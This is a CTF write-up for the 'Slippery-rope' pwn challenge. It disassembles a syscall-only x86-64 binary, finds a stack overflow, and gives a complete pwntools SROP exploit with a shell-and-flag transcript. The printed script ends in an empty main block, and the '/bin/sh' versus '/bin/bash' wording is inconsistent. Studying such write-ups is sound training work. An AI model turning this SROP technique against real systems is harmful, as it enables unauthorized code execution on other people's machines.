# Slippery-rope

### Description
Challenge : [Slippery-rope](https://gofile.io/d/W0FlmR)<br>
Category  : Pwn (binary exploitation)<br>
Hint      : Sigreturn Oriented Programming<br>

```
$ ./slippery-rope
.---------------------[ Slippery Rope ]---------------------.
|   \\//                                             \\//   |
|    //                                               //    |
|   //\\                                             //\\   |
|   \\//         _ _                                 \\//   |
|    //      ___| (_)_ __  _ __   ___ _ __ _   _      //    |
|   //\\    / __| | | '_ \| '_ \ / _ \ '__| | | |    //\\   |
|   \\//    \__ \ | | |_) | |_) |  __/ |  | |_| |    \\//   |
|    //     |___/_|_| .__/| .__/ \___|_|   \__, |     //    |
|   //\\            |_|   |_|              |___/     //\\   |
|   \\//            _ __ ___  _ __   ___             \\//   |
|    //            | '__/ _ \| '_ \ / _ \             //    |
|   //\\           | | | (_) | |_) |  __/            //\\   |
|   \\//           |_|  \___/| .__/ \___|            \\//   |
|    //                      |_|                      //    |
|   //\\                                             //\\   |
|   \\//                                             \\//   |
|    //                                               //    |
|   //\\                                             //\\   |
'-------------------------[ by hfz ]------------------------'
Dude I can't climb, that rope is so slippery... what should I do?
> aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
I already tried to "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", but it didn't work :/
Thanks anyways <:
```
This is a 64-bit stripped binary with only NX enabled, when executed, it takes some input and prints it back then exits<br>
### Static analysis
```
$ objdump -d -M intel ./slippery-rope 

./slippery-rope:     file format elf64-x86-64

Disassembly of section .text:

00000000004000f0 <.text>:
  4000f0:	b8 01 00 00 00       	mov    eax,0x1
  4000f5:	bf 01 00 00 00       	mov    edi,0x1
  4000fa:	48 be b8 01 60 00 00 	movabs rsi,0x6001b8
  400101:	00 00 00 
  400104:	ba d8 04 00 00       	mov    edx,0x4d8
  400109:	0f 05                	syscall 
  40010b:	e8 0a 00 00 00       	call   0x40011a
  400110:	48 31 ff             	xor    rdi,rdi
  400113:	b8 3c 00 00 00       	mov    eax,0x3c
  400118:	0f 05                	syscall 
  40011a:	55                   	push   rbp
  40011b:	48 89 e5             	mov    rbp,rsp
  40011e:	48 81 ec c8 00 00 00 	sub    rsp,0xc8
  400125:	b8 01 00 00 00       	mov    eax,0x1
  40012a:	bf 01 00 00 00       	mov    edi,0x1
  40012f:	48 be 91 06 60 00 00 	movabs rsi,0x600691
  400136:	00 00 00 
  400139:	ba 45 00 00 00       	mov    edx,0x45
  40013e:	0f 05                	syscall 
  400140:	48 31 c0             	xor    rax,rax
  400143:	48 31 ff             	xor    rdi,rdi
  400146:	48 89 e6             	mov    rsi,rsp
  400149:	ba 00 02 00 00       	mov    edx,0x200
  40014e:	0f 05                	syscall 
  400150:	80 7c 04 ff 0a       	cmp    BYTE PTR [rsp+rax*1-0x1],0xa
  400155:	75 08                	jne    0x40015f
  400157:	c6 44 04 ff 00       	mov    BYTE PTR [rsp+rax*1-0x1],0x0
  40015c:	48 ff c8             	dec    rax
  40015f:	b9 14 00 00 00       	mov    ecx,0x14
  400164:	48 bf b8 01 60 00 00 	movabs rdi,0x6001b8
  40016b:	00 00 00 
  40016e:	48 be d6 06 60 00 00 	movabs rsi,0x6006d6
  400175:	00 00 00 
  400178:	f3 a4                	rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
  40017a:	48 89 c1             	mov    rcx,rax
  40017d:	48 89 e6             	mov    rsi,rsp
  400180:	f3 a4                	rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
  400182:	b9 2c 00 00 00       	mov    ecx,0x2c
  400187:	48 be ea 06 60 00 00 	movabs rsi,0x6006ea
  40018e:	00 00 00 
  400191:	f3 a4                	rep movs BYTE PTR es:[rdi],BYTE PTR ds:[rsi]
  400193:	48 89 fa             	mov    rdx,rdi
  400196:	48 81 ea b8 01 60 00 	sub    rdx,0x6001b8
  40019d:	b8 01 00 00 00       	mov    eax,0x1
  4001a2:	bf 01 00 00 00       	mov    edi,0x1
  4001a7:	48 be b8 01 60 00 00 	movabs rsi,0x6001b8
  4001ae:	00 00 00 
  4001b1:	0f 05                	syscall 
  4001b3:	c9                   	leave  
  4001b4:	c3                   	ret    
  4001b5:	58                   	pop    rax
  4001b6:	c3                   	ret
```
After reading the assembly code We can notice 3 important things:<br>
1_ The buffer-overflow (the stack only allocates 200 bytes, but the read syscall reads 512 bytes)<br>
2_ No libc linked (the binary only uses syscalls, so we can't ret2libc)<br>
3_ There are only 2 gadgets, not enough for a ROPchain, but enough to get a shell!<br>

### Exploitation
As the hint suggests, the way to exploit this challenge is Sigreturn Oriented Programming,
the sigreturn syscall is used to restore registers' values previously saved on the stack, so we can
write the string '/bin/sh' to the stack and create a fake frame on the stack and call the sigreturn syscall
(using 'pop rax; ret;' and 'syscall' gadgets) which will set the required registers' values to execute 
an execve('/bin/sh', 0, 0) syscall and pop a shell!
```python
#!/usr/bin/env python2

from pwn import *

exe = ELF("./slippery-rope")
context.binary = exe

pop_rax_ret = 0x4001b5
syscall_ret = 0x4001b1

def conn():
    if args.LOCAL:
        return process([exe.path])
    else:
        return remote("pwn.hfz-1337.ninja", 1337)


def main():
    r = conn()

    #fake frame to set the registers
    frame = SigreturnFrame()
    frame.rax = 59 # the execve syscall
    frame.rdi = 0x6001cc # the address of '/bin/sh\0'
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret

    payload = '/bin/bash\0'.ljust(208, 'a')
    payload += p64(pop_rax_ret)
    payload += p64(15) #the sigreturn syscall
    payload += p64(syscall_ret)
    payload += str(frame)

    r.recvuntil('> ')
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
```
### Flag
```
$ ./exploit.py 
[*] '/home/shell/Documents/shellmates/slippery-rope'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to pwn.hfz-1337.ninja on port 1337: Done
[*] Switching to interactive mode
\x00I already tried to "/bin/bash\x00aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\xb5@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00, but it didn't work :/
Thanks anyways <:
\x00
$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
$ ls
flag.txt
slippery_rope
$ cat flag.txt
shellmates{th4nKs_m8_n0w_1_c4n_cl1mb_th4T_r0p3_0f05}
Related research paper: https://www.cs.vu.nl/~herbertb/papers/srop_sp14.pdf
$ exit
```
